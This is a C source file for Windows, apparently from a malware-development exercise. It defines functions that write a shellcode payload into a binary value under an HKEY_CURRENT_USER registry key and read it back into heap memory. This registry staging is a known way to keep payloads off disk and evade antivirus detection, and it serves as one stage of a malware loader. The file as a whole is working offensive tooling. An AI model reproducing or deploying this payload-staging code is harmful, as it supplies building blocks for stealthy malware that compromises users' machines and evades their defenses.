#include <Windows.h>
#include <stdio.h>
#include "registry.h"

#pragma comment (lib, "Advapi32.lib") // Used to compile RegGetValueA

BOOL ReadShellcodeFromRegistry(IN DWORD sPayloadSize, OUT PBYTE* ppPayload, IN LPCSTR RegisterName, IN LPCSTR RegisterKeyName) {
    LSTATUS     STATUS = NULL;
    DWORD		dwBytesRead = sPayloadSize;
    PVOID		pBytes = NULL;

    // Allocating heap that will store the payload that will be read
    pBytes = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sPayloadSize);
    if (pBytes == NULL) {
        printf("[!] HeapAlloc Failed With Error : %d\n", GetLastError());
        return FALSE;
    }

    // Reading the payload from "REGISTRY" key, from value "REGSTRING"
    STATUS = RegGetValueA(HKEY_CURRENT_USER, RegisterName, RegisterKeyName, RRF_RT_ANY, NULL, pBytes, &dwBytesRead);
    if (ERROR_SUCCESS != STATUS) {
        printf("[!] RegGetValueA Failed With Error : %d\n", STATUS);
        return FALSE;
    }

    // Checking if all bytes of the payload were successfully read
    if (sPayloadSize != dwBytesRead) {
        printf("[!] Total Bytes Read : %d ; Instead Of Reading : %d\n", dwBytesRead, sPayloadSize);
        return FALSE;
    }

    // Saving 
    *ppPayload = pBytes;

    return TRUE;
}

BOOL WriteShellcodeToRegistry(IN PBYTE pShellcode, IN DWORD dwShellcodeSize, IN LPCSTR RegisterName, IN LPCSTR RegisterKeyName) {

    BOOL        bSTATE = TRUE;
    LSTATUS     STATUS = NULL;
    HKEY        hKey = NULL;

    printf("[i] Writing 0x%p [ Size: %ld ] to \"%s\\%s\" ... ", pShellcode, dwShellcodeSize, RegisterName, RegisterKeyName);

    // Opening handle to "REGISTRY" registry key
    STATUS = RegOpenKeyExA(HKEY_CURRENT_USER, RegisterName, 0, KEY_SET_VALUE, &hKey);
    if (ERROR_SUCCESS != STATUS) {
        printf("[!] RegOpenKeyExA Failed With Error : %d\n", STATUS);
        bSTATE = FALSE; goto _EndOfFunction;
    }

    // Creating string value "REGSTRING" and writing the payload to it as a binary value
    STATUS = RegSetValueExA(hKey, RegisterKeyName, 0, REG_BINARY, pShellcode, dwShellcodeSize);
    if (ERROR_SUCCESS != STATUS) {
        printf("[!] RegSetValueExA Failed With Error : %d\n", STATUS);
        bSTATE = FALSE; goto _EndOfFunction;
    }

    printf("[+] DONE ! \n");


_EndOfFunction:
    if (hKey)
        RegCloseKey(hKey);
    return bSTATE;
}
